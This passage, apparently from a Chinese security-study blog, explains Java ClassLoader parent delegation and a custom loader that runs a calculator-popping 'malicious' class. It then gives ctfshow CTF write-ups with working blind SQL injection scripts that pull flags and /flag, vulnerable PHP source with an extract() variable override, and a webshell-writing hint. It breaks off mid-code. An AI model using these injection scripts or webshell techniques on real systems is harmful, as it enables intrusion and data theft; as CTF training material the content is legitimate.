<li>调用<code>findLoadedClass</code>检查是否已加载，若已加载则直接返回已加载的类</li>
<li>如果创建ClassLoader时传入了父类加载器(<code>new ClassLoader(父类加载器)</code>)则使用父类加载器先加载,否则使用JVM的<code>Bootstrap ClassLoader</code>加载</li>
<li>若父类加载器无法加载则调用自身<code>findClass</code>加载</li>
<li>如果调用loadClass的时候传入的<code>resolve</code>参数为true，那么还需要调用<code>resolveClass</code>方法链接类,默认为false</li>
<li>加载失败或返回加载后的<code>java.lang.Class</code>类对象</li>
</ol>
<h1 id="类加载机制-双亲委派"><a href="#类加载机制-双亲委派" class="headerlink" title="类加载机制-双亲委派"></a>类加载机制-双亲委派</h1><p>jvm对class文件采用的是按需加载的方式，当需要使用该类时，jvm才会将它的class文件加载到内存中产生class对象。</p>
<p>在加载类的时候，是采用的<code>双亲委派机制</code>，即把请求交给父类处理的一种<code>任务委派模式。</code></p>
<p>这也被叫做<code>双亲委派模型</code>，在jdk1.2之后引入</p>
<blockquote>
<p>其中，两个用户自定义类加载器的父加载器是AppClassLoader，AppClassLoader的父加载器是ExtClassLoader，ExtClassLoader是没有父类加载器的，在代码中，ExtClassLoader的父类加载器为null。BootstrapClassLoader也并没有子类，因为他完全由JVM实现。</p>
</blockquote>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220318212050-guhqqwe.png" alt="image.png"></p>
<h2 id="工作逻辑"><a href="#工作逻辑" class="headerlink" title="工作逻辑"></a>工作逻辑</h2><p>（1）如果一个<code>类加载器</code>接收到了<code>类加载</code>的请求，它自己不会先去加载，会把这个请求委托给<code>父类加载器</code>去执行。</p>
<p>（2）如果父类还存在父类加载器，则继续向上委托，一直委托到<code>启动类加载器：Bootstrap ClassLoader</code></p>
<p>（3）如果父类加载器可以完成加载任务，就返回成功结果，如果父类加载失败，就由子类自己去尝试加载，如果子类加载失败就会抛出<code>ClassNotFoundException</code>异常，这就是<code>双亲委派模式</code></p>
<h2 id="使用目的"><a href="#使用目的" class="headerlink" title="使用目的"></a>使用目的</h2><p>双亲委派模型能够保证类在内存中的<strong>唯一性</strong>，能够保证系统级别类的安全，因为当启动类ClassLoader加载过了之后，子ClassLoader便不会再加载：</p>
<p>1、防止重复加载同一个<code>.class</code>。通过委托去向上面问一问，加载过了，就不用再加载一遍。保证数据安全。<br>2、保证核心<code>.class</code>不能被篡改。通过委托方式，不会去篡改核心<code>.clas</code>，即使篡改也不会去加载，即使加载也不会是同一个<code>.class</code>对象了。不同的加载器加载同一个<code>.class</code>也不是同一个<code>Class</code>对象。这样保证了<code>Class</code>执行安全。</p>
<h2 id="运行原理"><a href="#运行原理" class="headerlink" title="运行原理"></a>运行原理</h2><p>loadClass方法如下，代码中做了注释解析</p>
<p>双亲委派模型实现的核心就是这个loadClass方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">        <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">        <span class="comment">// 先查看这个类是否已经被自己加载了</span></span><br><span class="line">        Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">t0</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 如果有父类加载器，先委派给父类加载器来加载</span></span><br><span class="line">                <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                    c = parent.loadClass(name, <span class="literal">false</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 如果父类加载器为null，说明ExtClassLoader也没有找到目标类，则调用BootstrapClassLoader来查找</span></span><br><span class="line">                    c = findBootstrapClassOrNull(name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果都没有找到，调用findClass方法，尝试自己加载这个类</span></span><br><span class="line">            <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                <span class="comment">// to find the class.</span></span><br><span class="line">                <span class="type">long</span> <span class="variable">t1</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                c = findClass(name);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">            resolveClass(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a>自定义ClassLoader</h1><p>我们可以实现自己的类加载器，加载<strong>指定路径</strong>下的class文件</p>
<ul>
<li>通过loadClass在指定的路径下查找文件。</li>
<li>通过findClass方法解析class字节流，并实例化class对象。</li>
</ul>
<p>编写一个自己的ClassLoader</p>
<blockquote>
<p>defineClass：将字节码变成内存中的class</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xianbei.test3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String classPath;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestClassLoader</span><span class="params">(String classPath)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.classPath = classPath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] classBytes = getData(name);</span><br><span class="line">            <span class="comment">//defineClass来生成class实例</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(name,classBytes,<span class="number">0</span>,classBytes.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//该方法读取目标class文件的字节码并返回</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[] getData(String className) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> classPath+ File.separator + className.replace(<span class="string">&#x27;.&#x27;</span>, File.separatorChar) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//读取字节</span></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(path);</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">stream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> ((num = is.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                stream.write(buffer, <span class="number">0</span> ,num);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> stream.toByteArray();</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>然后我们尝试加载自己电脑上指定路径的class文件：</p>
<p>这是我要加载的class文件，之前用JAVAssist控制字节码编写的恶意类</p>
<blockquote>
<p>这里有个静态块，就是最后的static</p>
<p>在实例化的时候会被自动加载</p>
<p>关于JAVAssist不在此多做赘述</p>
</blockquote>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220318233518-9dfmw13.png" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCLDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">TestClassLoader</span> <span class="variable">myClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestClassLoader</span>(<span class="string">&quot;C:\\Users\\Liyc\\IdeaProjects\\JavassistTest\\out&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; newStudent = myClassLoader.loadClass(<span class="string">&quot;NewStudent&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; c = newStudent.getDeclaredConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> c.newInstance(<span class="string">&quot;Xianbei&quot;</span>,<span class="number">19</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220318233657-sw8m038.png" alt="image.png"></p>
<p>成功弹出计算机，也就是成功加载了指定路径下的class文件并且用反射将其实例化了。</p>
<h1 id="URLClassLoader類代碼示例"><a href="#URLClassLoader類代碼示例" class="headerlink" title="URLClassLoader類代碼示例"></a>URLClassLoader類代碼示例</h1><p>URLClassLoader是ClassLoader的子类，它用于从指向 JAR 文件和目录的 URL 的搜索路径加载类和资源。也就是说，通过URLClassLoader就可以加载指定jar中的class到内存中。</p>
<p><a href="https://vimsky.com/zh-tw/examples/detail/java-class-java.net.URLClassLoader.html">https://vimsky.com/zh-tw/examples/detail/java-class-java.net.URLClassLoader.html</a></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/9002">https://xz.aliyun.com/t/9002</a></p>
<p><a href="https://www.cnblogs.com/goloving/p/14438785.html">https://www.cnblogs.com/goloving/p/14438785.html</a>讲双亲委派的</p>
<p><a href="https://www.jianshu.com/p/fe8a01b0c3b7">https://www.jianshu.com/p/fe8a01b0c3b7</a>讲java代码运行机制的</p>
<p><a href="https://zhuanlan.zhihu.com/p/67991761">https://zhuanlan.zhihu.com/p/67991761</a>讲类加载的</p>
<p><a href="https://www.cnblogs.com/xrq730/p/4847337.html">https://www.cnblogs.com/xrq730/p/4847337.html</a>很多种类加载器的写法</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220318213310-uz3iggg.png" alt="image.png"></p>
]]></content>
      <categories>
        <category>javaSec</category>
      </categories>
      <tags>
        <tag>ClassLoader学习</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow中期测评</title>
    <url>/2022/03/31/ctfshow%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>我认为的ctfshow是一个用来培养自己解决问题能力的平台。</p>
<p>没有卡住的标记为√</p>
<h1 id="web486√"><a href="#web486√" class="headerlink" title="web486√"></a>web486√</h1><p>后台扫描发现flag.php</p>
<p>结合报错信息包含。。</p>
<h1 id="web487√"><a href="#web487√" class="headerlink" title="web487√"></a>web487√</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://fcd97f15-0d16-4de5-a13a-0e6412c443d4.challenge.ctf.show/index.php?action=check&amp;username=admin\&quot;&#x27;)&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&#x27;or 1=if(ascii(substr((select group_concat(flag) from ctfshow.flag),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(1),0) -- -&amp;password=admin&#x27;</span></span><br><span class="line">        <span class="comment">#ctfshow</span></span><br><span class="line">        <span class="comment">#flag,user</span></span><br><span class="line">        <span class="comment">#flag</span></span><br><span class="line">        <span class="comment">#ctfshow&#123;ae5e5fa3-d1d2-40ee-b32e-13904333f973&#125;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url + payload, timeout=<span class="number">0.5</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<h1 id="web488√"><a href="#web488√" class="headerlink" title="web488√"></a>web488√</h1><p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/render_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$action</span>))&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">	<span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;check&#x27;</span>)&#123;</span><br><span class="line">	<span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	<span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;select id from user where username = &#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$username</span>).<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>).<span class="string">&quot;&#x27; order by id limit 1&quot;</span>;</span><br><span class="line">	<span class="variable">$user</span>=db::<span class="title function_ invoke__">select_one</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">		template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>,<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$username</span>));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;error&#x27;</span>,<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$username</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;login&#x27;</span>)&#123;</span><br><span class="line">	template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>render_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;On&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;cache_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(cache::<span class="title function_ invoke__">cache_exists</span>(<span class="variable">$template</span>))&#123;</span><br><span class="line">			<span class="keyword">echo</span> cache::<span class="title function_ invoke__">get_cache</span>(<span class="variable">$template</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">			<span class="variable">$cache</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">			cache::<span class="title function_ invoke__">create_cache</span>(<span class="variable">$template</span>,<span class="variable">$cache</span>);</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable">$cache</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;On&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">create_cache</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>))&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			file<span class="title class_">Util</span>::<span class="title function_ invoke__">write</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>,<span class="variable">$content</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_cache</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_exists</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>模板注入（？）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cache::<span class="variable constant_">create_cache</span> 可以写入文件</span><br><span class="line"></span><br><span class="line">render中调用了</span><br><span class="line">cache::<span class="title function_ invoke__">create_cache</span>(<span class="variable">$template</span>,<span class="variable">$cache</span>);</span><br><span class="line"></span><br><span class="line">这里<span class="variable">$template</span>为<span class="string">&#x27;error&#x27;</span></span><br><span class="line"><span class="variable">$cache</span>为</span><br></pre></td></tr></table></figure>


<p>可以在username里写入一句话</p>
<h1 id="web489√"><a href="#web489√" class="headerlink" title="web489√"></a>web489√</h1><p>变量覆盖盲注</p>
<p>和上一题读源码的方式相同</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/render_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$action</span>))&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">	<span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;check&#x27;</span>)&#123;</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;select id from user where username = &#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$username</span>).<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>).<span class="string">&quot;&#x27; order by id limit 1&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">	<span class="variable">$user</span>=db::<span class="title function_ invoke__">select_one</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">		template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>,<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$username</span>));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;clear&#x27;</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -rf cache/*&#x27;</span>);</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;cache clear&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;login&#x27;</span>)&#123;</span><br><span class="line">	template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>12行的extract十分显眼，存在变量覆盖漏洞，那<code>$sql</code>我们也可控了</p>
<p>这样可以盲注</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php?action=check&amp;sql=select id <span class="keyword">from</span> user where id = -<span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>脚本如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://806b79c8-10ce-4e09-b1c7-a5eec69d6f88.challenge.ctf.show/index.php?action=check&amp;sql=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#二分法</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = f<span class="string">&quot;select id from user where id = -1 or 1=if(ascii(substr((select load_file(&#x27;/flag&#x27;)),&#123;i&#125;,1))&lt;=&#123;mid&#125;,1,0);&quot;</span></span><br><span class="line">        r = requests.<span class="title function_ invoke__">get</span>(url+payload)</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;欢迎你&quot;</span> in r.text):</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            head = mid +<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="title function_ invoke__">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span>(result)</span><br></pre></td></tr></table></figure>

<h1 id="web490√，web491√"><a href="#web490√，web491√" class="headerlink" title="web490√，web491√"></a>web490√，web491√</h1><p>盲注</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;check&#x27;</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;select username from user where username = &#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>).<span class="string">&quot;&#x27; order by id limit 1&quot;</span>;</span><br><span class="line">	<span class="variable">$user</span>=db::<span class="title function_ invoke__">select_one</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">		template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>,<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$user</span>-&gt;username));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span 